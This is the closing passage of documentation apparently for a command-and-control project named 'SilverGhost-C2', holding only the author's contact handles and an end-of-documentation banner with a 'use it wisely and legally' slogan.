- **GitHub:** [JDEXPLOIT/SilverGhost-C2]
- **Discord:** JDEXPLOIT#0001
- **Email:** jdexploit@proton.me (Authorized inquiries only)

---

```
╔═══════════════════════════════════════════════════════════════════════════════╗
║                    END OF DOCUMENTATION - JDEXPLOIT 2026                       ║
║              "Knowledge is power. Use it wisely and legally."                  ║
╚═══════════════════════════════════════════════════════════════════════════════╝
```
